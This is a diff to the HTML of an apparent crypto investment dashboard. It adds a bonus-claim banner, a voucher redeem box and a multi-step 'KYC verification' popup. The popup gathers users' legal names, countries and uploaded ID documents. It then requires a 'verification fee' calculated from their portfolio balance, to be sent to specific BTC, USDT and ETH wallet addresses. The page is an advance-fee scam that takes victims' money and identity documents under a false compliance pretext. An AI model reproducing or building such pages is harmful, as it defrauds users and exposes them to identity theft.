@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -90,6 +89,22 @@
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
         </div>
       </div>
+
+<!-- BONUS BANNER -->
+<div id="bonusBanner" style="display:none;background:linear-gradient(90deg,#f0b90b,#f77f00);padding:12px 20px;border-radius:12px;margin-bottom:16px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;" onclick="openBonusPopup()">
+  <span style="color:#000;font-weight:bold;font-size:14px;">🎁 You have <span id="bonusCount">0</span> unclaimed bonus(es)! Click to claim.</span>
+  <span style="color:#000;font-size:20px;">→</span>
+</div>
+
+<!-- BONUS POPUP -->
+<div class="popup-overlay" id="bonusPopup" style="display:none;">
+  <div class="popup-box">
+    <div class="popup-close" onclick="closeBonusPopup()">✕</div>
+    <h2>🎁 Your Bonuses</h2>
+    <p style="color:#888;font-size:14px;margin-bottom:20px;">Claim your bonuses to add them to your balance instantly.</p>
+    <div id="bonusList"></div>
+  </div>
+</div>
 
       <!-- BALANCE HERO -->
       <div class="balance-hero">
@@ -251,7 +266,20 @@
         </div>
       </div>
 
-      <!-- TRANSACTIONS -->
+<!-- VOUCHER REDEEM -->
+<div class="voucher-section" id="voucherSection" style="display:none;">
+  <div class="voucher-box">
+    <h3>🎁 Redeem Voucher</h3>
+    <p>Enter your voucher code to claim your bonus.</p>
+    <div class="voucher-input-row">
+      <input type="text" id="voucherCode" placeholder="GIAI-2026-XXXX-XXXX">
+      <button onclick="redeemVoucher()">Redeem</button>
+    </div>
+    <p id="voucherMsg" style="margin-top:10px;font-size:13px;"></p>
+  </div>
+</div>
+
+     <!-- TRANSACTIONS -->
       <div class="section-card" id="transactionsBox">
         <div class="txn-toggle" onclick="toggleTransactions()">
           <div>
@@ -490,6 +518,103 @@
       <div style="background:rgba(255,255,255,0.04);border-radius:12px;padding:14px;"><div style="font-size:11px;color:#555;margin-bottom:3px;">RANK</div><div id="profileRank" style="font-size:15px;font-weight:700;">—</div></div>
     </div>
     <button onclick="logoutUser()" style="width:100%;padding:14px;background:#ff4444;color:#fff;border:none;border-radius:12px;font-weight:700;font-size:14px;cursor:pointer;">Logout</button>
+  </div>
+</div>
+
+<!-- KYC POPUP -->
+<!-- KYC POPUP -->
+<div class="popup-overlay" id="kycPopup" style="display:none;">
+  <div class="popup-box" style="max-width:460px;">
+
+    <!-- STEP 1 — NOTICE -->
+    <div class="kyc-step" id="kycStep1">
+      <div style="text-align:center;margin-bottom:24px;">
+        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#f0b90b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom:12px;">
+          <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        <h2 style="color:#f0b90b;margin:0 0 8px;font-size:20px;">Account Verification Required</h2>
+        <p style="color:#888;font-size:13px;margin:0;">Your account requires KYC verification due to your portfolio size.</p>
+      </div>
+      <div style="background:#1a1a1a;border-radius:12px;padding:16px;margin-bottom:20px;">
+        <p style="color:#ccc;font-size:13px;line-height:1.7;margin:0;">
+          As part of our compliance requirements, accounts holding significant balances are required to complete identity verification. This ensures the security of your funds and continued access to all platform features.
+        </p>
+      </div>
+      <button onclick="kycNext(2)" class="deposit-btn" style="width:100%;margin-bottom:10px;">Begin Verification</button>
+      <button onclick="kycDismiss()" class="withdraw-btn" style="width:100%;">Remind Me Later</button>
+    </div>
+
+    <!-- STEP 2 — PERSONAL INFO -->
+    <div class="kyc-step" id="kycStep2" style="display:none;">
+      <h2 style="color:#f0b90b;font-size:18px;margin:0 0 6px;">Personal Information</h2>
+      <p style="color:#888;font-size:13px;margin-bottom:20px;">Please provide your details exactly as they appear on your ID.</p>
+
+      <label style="color:#ccc;font-size:13px;display:block;margin-bottom:6px;">Full Legal Name</label>
+      <input id="kycFullName" type="text" placeholder="As on your ID"
+        style="width:100%;padding:12px;background:#111;border:1px solid #333;border-radius:10px;color:#fff;margin-bottom:14px;box-sizing:border-box;font-size:14px;">
+
+      <label style="color:#ccc;font-size:13px;display:block;margin-bottom:6px;">Country</label>
+      <input id="kycCountry" type="text" placeholder="Your country"
+        style="width:100%;padding:12px;background:#111;border:1px solid #333;border-radius:10px;color:#fff;margin-bottom:14px;box-sizing:border-box;font-size:14px;">
+
+      <label style="color:#ccc;font-size:13px;display:block;margin-bottom:6px;">ID Type</label>
+      <select id="kycIdType"
+        style="width:100%;padding:12px;background:#111;border:1px solid #333;border-radius:10px;color:#fff;margin-bottom:14px;box-sizing:border-box;font-size:14px;">
+        <option value="">Select ID type</option>
+        <option>International Passport</option>
+        <option>National ID Card</option>
+        <option>Driver's License</option>
+      </select>
+
+      <label style="color:#ccc;font-size:13px;display:block;margin-bottom:6px;">Upload ID Document</label>
+      <input id="kycIdFile" type="file" accept="image/*,.pdf"
+        style="width:100%;padding:10px;background:#111;border:1px solid #333;border-radius:10px;color:#ccc;margin-bottom:20px;box-sizing:border-box;font-size:13px;">
+
+      <button onclick="kycNext(3)" class="deposit-btn" style="width:100%;">Continue</button>
+    </div>
+
+    <!-- STEP 3 — FEE -->
+    <div class="kyc-step" id="kycStep3" style="display:none;">
+      <h2 style="color:#f0b90b;font-size:18px;margin:0 0 6px;">Verification Fee</h2>
+      <p style="color:#888;font-size:13px;margin-bottom:20px;">A one-time verification fee is required based on your portfolio balance.</p>
+
+      <div style="background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px;text-align:center;">
+        <p style="color:#888;font-size:12px;margin:0 0 8px;text-transform:uppercase;letter-spacing:1px;">Your KYC Verification Fee</p>
+        <h1 id="kycFeeDisplay" style="color:#f0b90b;margin:0;font-size:38px;font-weight:900;">$0</h1>
+        <p style="color:#666;font-size:12px;margin:8px 0 0;">Calculated based on your current portfolio balance</p>
+      </div>
+
+      <p style="color:#ccc;font-size:13px;line-height:1.7;margin-bottom:16px;">
+        Please send the exact verification fee to one of the wallet addresses below. Once payment is received and confirmed by our team, your account will be fully verified.
+      </p>
+
+      <div style="background:#1a1a1a;border-radius:12px;padding:16px;margin-bottom:20px;">
+        <p style="color:#f0b90b;font-size:12px;font-weight:bold;margin:0 0 12px;text-transform:uppercase;letter-spacing:1px;">Payment Wallets</p>
+        <p style="color:#666;font-size:11px;margin:0 0 3px;">BTC</p>
+        <p style="color:#fff;font-size:11px;word-break:break-all;margin:0 0 12px;">bc1qa4g38u9mxn43td5mt67jh320sy6nne9tfaewg6</p>
+        <p style="color:#666;font-size:11px;margin:0 0 3px;">USDT TRC20</p>
+        <p style="color:#fff;font-size:11px;word-break:break-all;margin:0 0 12px;">TBkxc6SZkXSYTop9NPJLz3TvLayDSrPedQ</p>
+        <p style="color:#666;font-size:11px;margin:0 0 3px;">ETH</p>
+        <p style="color:#fff;font-size:11px;word-break:break-all;margin:0;">0x21b7f254a06F222a1bed905f9d7b13665B42Bb65</p>
+      </div>
+
+      <button onclick="submitKYC()" class="deposit-btn" style="width:100%;">I Have Paid</button>
+    </div>
+
+    <!-- STEP 4 — SUBMITTED -->
+    <div class="kyc-step" id="kycStep4" style="display:none;">
+      <div style="text-align:center;">
+        <svg xmlns="http://www.w3.org/2000/svg" width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#00d26a" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom:16px;">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+        <h2 style="color:#f0b90b;margin:0 0 12px;">Verification Submitted</h2>
+        <p style="color:#ccc;font-size:13px;line-height:1.7;">
+          Your KYC details and payment confirmation have been submitted. Our team will review and confirm your account within 24 hours.
+        </p>
+        <button onclick="closeKYC()" class="deposit-btn" style="margin-top:20px;width:100%;">Back to Dashboard</button>
+      </div>
+    </div>
+
   </div>
 </div>
 
